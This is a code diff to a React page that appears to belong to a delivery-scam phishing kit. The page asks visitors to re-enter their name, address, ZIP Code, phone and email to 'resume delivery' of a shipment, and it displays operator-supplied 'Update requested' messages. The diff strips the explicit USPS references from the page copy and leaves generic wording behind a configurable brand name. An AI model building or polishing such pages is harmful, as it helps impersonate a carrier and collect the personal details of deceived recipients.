@@ -110,7 +110,7 @@ export default function Info() {
       setErrors({});
       setLoading(false);
 
-      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the delivery details for this USPS shipment.');
+      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the delivery details for this shipment.');
       navigate('/info', { replace: true });
       window.scrollTo({ top: 0, behavior: 'smooth' });
       setTimeout(() => inputRefs.current.fullname?.focus(), 0);
@@ -213,7 +213,7 @@ export default function Info() {
             <div>
               <div className="alz-badge">{BRAND.name}</div>
               <h1 className="alz-step-title">Confirm the delivery address for this shipment</h1>
-              <p className="alz-step-subtitle">Review the recipient and mailing details before USPS resumes delivery processing.</p>
+              <p className="alz-step-subtitle">Review the recipient and mailing details before delivery processing resumes.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -288,7 +288,7 @@ export default function Info() {
                 {loading ? 'Saving...' : 'Continue with address review'}
               </button>
               <p className="alz-helper-copy text-center mt-3">
-                USPS may ask you to reconfirm these details if the shipment record changes.
+                You may be asked to reconfirm these details if the shipment record changes.
               </p>
             </form>
 
@@ -302,7 +302,7 @@ export default function Info() {
               <div className="alz-order-mini-thumb" />
               <div>
                 <div className="alz-order-mini-title">Review the address currently on file</div>
-                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP Code, and contact details associated with this USPS shipment.</div>
+                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP Code, and contact details associated with this shipment.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
@@ -310,7 +310,7 @@ export default function Info() {
               <div>Street address, city, state, and ZIP Code</div>
               <div>Phone number and email for delivery updates</div>
             </div>
-            <div className="alz-side-summary-box">Use the mailing information tied to this shipment so USPS can resume final delivery steps.</div>
+            <div className="alz-side-summary-box">Use the mailing information tied to this shipment so delivery can resume.</div>
           </aside>
         </div>
       </div>
